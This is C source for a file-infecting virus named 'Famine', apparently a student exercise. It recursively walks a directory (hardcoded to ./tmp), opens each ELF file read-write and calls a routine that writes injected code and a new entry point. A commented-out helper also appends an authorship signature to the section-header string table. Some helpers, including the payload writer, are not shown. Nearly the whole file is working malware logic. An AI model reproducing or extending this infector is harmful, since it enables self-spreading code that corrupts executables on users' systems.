#include "virus.h"


void modify_strtab(int fd, struct ELFheaders64 fHdr) {
    struct sheaders64 sHdrs[fHdr.e_shnum];
    struct sheaders64 sHdr;
    int bytes_rd;
    const char signature[] = "Famine version 1.0 (c)oded by <pgoudet>-<Mastermind pgoudet>";

    if (checkSignature(fd, signature) == 1){
        return;
    }
    if(ft_syscall(LSEEK, (void *)fd, (void *)fHdr.e_shoff, 0, 0) == -1)
        return;
    bytes_rd = (int)ft_syscall(READ, (void *)fd, (void *)&sHdrs, (void *)(fHdr.e_shnum * fHdr.e_shentsize), 0);
    if (bytes_rd < fHdr.e_shnum * fHdr.e_shentsize)
        return;
    sHdrs[fHdr.e_shstrndx].sh_size += sizeof(signature);
    if(ft_syscall(LSEEK, (void *)fd, (void *)(fHdr.e_shoff + ((fHdr.e_shnum - 1) * fHdr.e_shentsize) + 0x20), 0, 0) == -1)
        return;
    if ((int)ft_syscall(WRITE, (void *)fd, (void *)&(sHdrs[fHdr.e_shstrndx].sh_size), (void *)8, 0) == -1)
        return;
    if(ft_syscall(LSEEK, (void *)fd, (void *)(sHdrs[fHdr.e_shstrndx].sh_offset + sHdrs[fHdr.e_shstrndx].sh_size), 0, 0) == -1)
        return;
    if ((int)ft_syscall(WRITE, (void *)fd, (void *)signature, (void *)sizeof(signature), 0) == -1)
        return;
 }

void virus(char *file) {
    struct ELFheaders64 fHdr;
    int bytes_rd;
    int fd;
    unsigned long int new_entry_point;

    fd = (int)ft_syscall(OPEN, (void *)file, (void *)2, 0, 0);
    if (fd < 0)
        return ;
    bytes_rd = (int)ft_syscall(READ, (void *)fd, (void *)&fHdr, (void *)0x40, 0);
    if (bytes_rd < 0x40 || check_file(fHdr) != 0)
        return;

    // modify_strtab(fd, fHdr);
    new_entry_point = writeFile(fd, fHdr);
    if (new_entry_point == 0) {
        ft_syscall(CLOSE, (void *)fd, 0, 0, 0);
        return;
    }

    ft_syscall(CLOSE, (void *)fd, 0, 0, 0);
}

int famine(char *target_dir) {
    int fd = 1;
    int options_openat = 0 | 2048 | 65536;
    struct linux_dirent {
            unsigned long  d_ino;
            unsigned long  d_off;
            unsigned short d_reclen;
            char           d_name[1024];
    } dir;
    int bytes_rode = 1;
    char full_path[0x1000];
   
    fd = (int)ft_syscall(OPENAT, (void *)-100, (void *)target_dir, (void *)options_openat, (void *)0);
    if (fd == -1)
        return(1);
    do {
        bytes_rode = (int)ft_syscall(GETDENTS, (void *)fd, (void *)&dir, (void *)0x1000, (void *)0);
        for (int bpos = 0; bpos < bytes_rode;) {
            struct linux_dirent *d = (struct linux_dirent *)((char *)&dir + bpos);
            if (ft_strcmp(d->d_name, ".") != 0 && ft_strcmp(d->d_name, "..") != 0)  {
                memncat(full_path, 0, target_dir, ft_strlen(target_dir));
                ft_strcat(full_path, "/");
                ft_strcat(full_path, d->d_name);
                if (isDir(full_path) == 1)
                    famine(full_path);
                else
                    virus(full_path);
                ft_memset(full_path, 0 , 0x1000);
            }
            bpos += d->d_reclen;
        }
    }
    while (bytes_rode > 0);
    return (0);
}

int main() {
    char *target_dir = "./tmp";
    
    famine(target_dir);
    ft_syscall(EXIT, 0, 0, 0, 0);
}

